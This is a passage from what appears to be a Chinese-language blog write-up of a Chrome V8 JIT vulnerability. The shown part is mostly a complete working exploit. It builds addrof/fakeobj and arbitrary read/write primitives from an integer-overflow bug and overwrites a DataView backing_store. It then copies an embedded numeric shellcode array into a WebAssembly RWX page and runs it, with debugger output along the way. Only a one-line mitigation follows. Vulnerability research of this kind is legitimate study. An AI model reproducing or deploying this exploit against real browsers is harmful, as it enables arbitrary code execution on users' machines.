<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="number">16</span>] = <span class="number">0x4242</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发编译优化，用超长数组arr修改cor数组的长度(arr[16]的偏移由调试得出)，获得另一个类型为float的越界长数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    arr[<span class="number">7</span>] = k;</span><br><span class="line">    <span class="keyword">return</span> ftoi(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    cor[<span class="number">0</span>] = itof(k);</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cor[0]和arr[7]指向同一个地址(调试得出)，由此构造addrof和fakeobj原语</span></span><br></pre></td></tr></table></figure>

<p>获取利用<code>cor</code>获取 float array 的 map 字段，创建一个 float array ，在该数组的数据中伪造另一个 float array 用 <code>fakeobj</code>将其转化成对象，这样就得到了一个完全可控的数组对象，可以用该对象中的 elements 实现任意地址读写。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> float_array_map = ftoi(cor[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr2 = [itof(float_array_map), <span class="number">1.2</span>, <span class="number">2.3</span>, <span class="number">3.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake = fakeobj(addrof(arr2) + <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbread</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    <span class="keyword">return</span> (fake[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbwrite</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(BigInt(val));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用Array的element属性伪造一个Array，构造arbread和arbwrite原语实现任意地址读写</span></span><br></pre></td></tr></table></figure>



<p>但是 float array 写入高地址会失败，原因还未求证，据说网友说是因为 double 类型的浮点数数组在处理 0x7f 开头的高地址时会出现将低 20 位与运算为 0 ，从而导致上述操作无法写入的错误，有时间求证一下。</p>
<p>为解决这一问题使用 DataView 对象，DataView 对象的 buffer 结构体中存储着的 backing_store 属性，记录的就是实际 DataView 申请的 Buffer 的内存地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x299b081484c1</span><br><span class="line">0x299b081484c1: [JSDataView]</span><br><span class="line"> - map: 0x299b08302ca5 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x299b082c8071 &lt;Object map &#x3D; 0x299b08302ccd&gt;</span><br><span class="line"> - elements: 0x299b08042229 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer &#x3D;0x299b08148489 &lt;ArrayBuffer map &#x3D; 0x299b083031f5&gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 16</span><br><span class="line"> - properties: 0x299b08042229 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"> - embedder fields &#x3D; &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x299b08148489</span><br><span class="line">0x299b08148489: [JSArrayBuffer]</span><br><span class="line"> - map: 0x299b083031f5 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x299b082c9c5d &lt;Object map &#x3D; 0x299b0830321d&gt;</span><br><span class="line"> - elements: 0x299b08042229 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store: 0x5611359e0300 &lt;-----存储实际内存地址</span><br><span class="line"> - byte_length: 16</span><br><span class="line"> - detachable</span><br><span class="line"> - properties: 0x299b08042229 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"> - embedder fields &#x3D; &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>如果用上面的任意地址读写将这个 backing_store 指针修改为我们想要写入的内存地址比如 0x41414141，那么我们再调用 view.setUint32(0, 0x44434241, true) 类似指令时，实际上就是向内存地址 0x41414141 处写入了 0x44434241 ，从而达到了任意地址写入的效果。这个基于 DataView 的写入，就不会触发 FloatArray 写入高地址的访问异常。</p>
<h5 id="Wasm"><a href="#Wasm" class="headerlink" title="Wasm"></a>Wasm</h5><p>Wasm 就是可以让 JavaScript 直接执行高级语言生成的机器码的一种技术。</p>
<p><a target="_blank" rel="noopener" href="https://wasdk.github.io/WasmFiddle/">WasmFiddle</a></p>
<p>Wasm 不允许浏览器直接调用系统函数，我们可以把 shellcode 写入到 Wasm 的代码内存中覆盖掉，再调用接口执行的就是我们自己的 shellcode。</p>
<p>代码所在内存的偏移不同版本有所不同，需要调试寻找，大致在 instance 对象中某个偏移，打印出来对照 vmmap 找到那段 rwx 的内存就是了。</p>
<p><img src="https://z3.ax1x.com/2021/10/08/59HbcQ.png"></p>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exploit.js</span></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>])</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Module(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.exports.main;</span><br><span class="line"><span class="comment">//供之后用shellcode覆写后调用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">	<span class="keyword">return</span> u64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">	u64_buf[<span class="number">0</span>] = val;</span><br><span class="line">	<span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ftoi和itof原语</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);</span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(x == <span class="number">-1</span>) x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);</span><br><span class="line">	arr.shift();</span><br><span class="line">	<span class="keyword">var</span> cor = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line">	<span class="keyword">return</span> [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//漏洞函数，先用本文漏洞构造整数溢出，再用Array.prototype.shift()的漏洞利用整数溢出构造越界超长数组arr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">0x3000</span>; ++i)</span><br><span class="line">    foo();</span><br><span class="line"></span><br><span class="line">[arr, cor] = foo();</span><br><span class="line"></span><br><span class="line">arr[<span class="number">16</span>] = <span class="number">0x4242</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发编译优化，用超长数组arr修改cor数组的长度(arr[16]的偏移由调试得出)，获得另一个类型为float的越界长数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    arr[<span class="number">7</span>] = k;</span><br><span class="line">    <span class="keyword">return</span> ftoi(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    cor[<span class="number">0</span>] = itof(k);</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cor[0]和arr[7]指向同一个地址(调试得出)，由此构造addrof和fakeobj原语</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_map = ftoi(cor[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr2 = [itof(float_array_map), <span class="number">1.2</span>, <span class="number">2.3</span>, <span class="number">3.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake = fakeobj(addrof(arr2) + <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbread</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    <span class="keyword">return</span> (fake[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbwrite</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(BigInt(val));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用Array的element属性伪造一个Array，构造arbread和arbwrite原语实现任意地址读写</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x150</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_shellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf2);</span><br><span class="line">    <span class="keyword">let</span> buf_addr = addrof(buf2);</span><br><span class="line">    <span class="keyword">let</span> backing_store_addr = buf_addr + <span class="number">0x14n</span>;</span><br><span class="line">    arbwrite(backing_store_addr, addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint32(<span class="number">4</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + <span class="number">0x68n</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Address of rwx page: &quot;</span> + rwx_page_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">3833809148</span>,<span class="number">12642544</span>,<span class="number">1363214336</span>,<span class="number">1364348993</span>,<span class="number">3526445142</span>,<span class="number">1384859749</span>,<span class="number">1384859744</span>,<span class="number">1384859672</span>,<span class="number">1921730592</span>,<span class="number">3071232080</span>,<span class="number">827148874</span>,<span class="number">3224455369</span>,<span class="number">2086747308</span>,<span class="number">1092627458</span>,<span class="number">1091422657</span>,<span class="number">3991060737</span>,<span class="number">1213284690</span>,<span class="number">2334151307</span>,<span class="number">21511234</span>,<span class="number">2290125776</span>,<span class="number">1207959552</span>,<span class="number">1735704709</span>,<span class="number">1355809096</span>,<span class="number">1142442123</span>,<span class="number">1226850443</span>,<span class="number">1457770497</span>,<span class="number">1103757128</span>,<span class="number">1216885899</span>,<span class="number">827184641</span>,<span class="number">3224455369</span>,<span class="number">3384885676</span>,<span class="number">3238084877</span>,<span class="number">4051034168</span>,<span class="number">608961356</span>,<span class="number">3510191368</span>,<span class="number">1146673269</span>,<span class="number">1227112587</span>,<span class="number">1097256961</span>,<span class="number">1145572491</span>,<span class="number">1226588299</span>,<span class="number">2336346113</span>,<span class="number">21530628</span>,<span class="number">1096303056</span>,<span class="number">1515806296</span>,<span class="number">1497454657</span>,<span class="number">2202556993</span>,<span class="number">1379999980</span>,<span class="number">1096343807</span>,<span class="number">2336774745</span>,<span class="number">4283951378</span>,<span class="number">1214119935</span>,<span class="number">442</span>,<span class="number">0</span>,<span class="number">2374846464</span>,<span class="number">257</span>,<span class="number">2335291969</span>,<span class="number">3590293359</span>,<span class="number">2729832635</span>,<span class="number">2797224278</span>,<span class="number">4288527765</span>,<span class="number">3296938197</span>,<span class="number">2080783400</span>,<span class="number">3774578698</span>,<span class="number">1203438965</span>,<span class="number">1785688595</span>,<span class="number">2302761216</span>,<span class="number">1674969050</span>,<span class="number">778267745</span>,<span class="number">6649957</span>];</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line"><span class="comment">//用构造的读写原语控制ArrayBuffer的backing_store字段和wasm的机器码内存，将shellcode写入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f();</span><br><span class="line"><span class="comment">//执行wasm</span></span><br></pre></td></tr></table></figure>

<h2 id="四、缓解措施"><a href="#四、缓解措施" class="headerlink" title="四、缓解措施"></a>四、缓解措施</h2><p>更新新版Chrome</p>
<h2 id="五、参考文献"><a href="#五、参考文献" class="headerlink" title="五、参考文献"></a>五、参考文献</h2><p><a target="_blank" rel="noopener" href="https://eternalsakura13.com/2018/05/06/v8/">https://eternalsakura13.com/2018/05/06/v8/</a><br><a target="_blank" rel="noopener" href="https://ruan777.github.io/2021/04/21/Chrome_issue_1196683_1195777/">https://ruan777.github.io/2021/04/21/Chrome_issue_1196683_1195777/</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/1556/">https://paper.seebug.org/1556/</a><br><a target="_blank" rel="noopener" href="https://www.venustech.com.cn/new_type/aqldfx/20210416/22627.html">https://www.venustech.com.cn/new_type/aqldfx/20210416/22627.html</a><br><a target="_blank" rel="noopener" href="https://kiprey.github.io/2021/01/v8-turboFan/#%E5%9B%9B%E3%80%81turboFan%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B">https://kiprey.github.io/2021/01/v8-turboFan/#%E5%9B%9B%E3%80%81turboFan%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B</a><br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000039908658">https://segmentfault.com/a/1190000039908658</a><br><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/21Y1">https://www.4hou.com/posts/21Y1</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html">https://www.freebuf.com/vuls/203721.html</a></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='http://music.163.com/song/media/outer/url?id=420154189.mp3'></li>
                        
                    
                        
                            <li title='1' data-url='http://music.163.com/song/media/outer/url?id=527957820.mp3'></li>
                        
                    
                        
                            <li title='2' data-url='http://music.163.com/song/media/outer/url?id=1645064.mp3'></li>
                        
                    
                        
                            <li title='3' data-url='http://music.163.com/song/media/outer/url?id=39635710.mp3'></li>
                        
                    
                        
                            <li title='4' data-url='http://music.163.com/song/media/outer/url?id=464448450.mp3'></li>
                        
                    
                        
                            <li title='5' data-url='http://music.163.com/song/media/outer/url?id=33875750.mp3'></li>
                        
                    
                        
                            <li title='6' data-url='http://music.163.com/song/media/outer/url?id=864711417.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='true'
        data-ae='true'
        data-ci='b4b7681976b71e1c4b85'
        data-cs='1c0802349efe79789f01f3b548e96a4baf049907'
        data-r='HNightMan.github.io'
        data-o='HNightMan'
        data-a='HNightMan'
        data-d='false'
    >查看评论</div>


    </div>
    
        <div class='side'>
			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">一、漏洞信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1. 漏洞简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%84%E4%BB%B6%E6%A6%82%E8%BF%B0"><span class="toc-number">1.2.</span> <span class="toc-text">2. 组件概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">3. 漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="toc-number">1.4.</span> <span class="toc-text">4. 漏洞影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">1.5.</span> <span class="toc-text">5. 解决方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">1. 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text">2. 复现过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">三、漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.</span> <span class="toc-text">1. 基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">3.2.</span> <span class="toc-text">2. 背景知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">3.3.</span> <span class="toc-text">3. 详细分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E5%88%86%E6%9E%90"><span class="toc-number">3.3.1.</span> <span class="toc-text">1. 基础分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">3.3.2.</span> <span class="toc-text">2. 静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%A1%A5%E4%B8%81Diff"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">1. 补丁Diff</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-number">3.3.2.2.</span> <span class="toc-text">2. 漏洞函数分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">3.3.3.</span> <span class="toc-text">3. 动态分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.4.</span> <span class="toc-text">4. 利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.4.1.</span> <span class="toc-text">1. 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">3.4.2.</span> <span class="toc-text">2. 利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E7%9A%84%E6%95%B0%E7%BB%84"><span class="toc-number">3.4.2.1.</span> <span class="toc-text">构造整数溢出的数组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 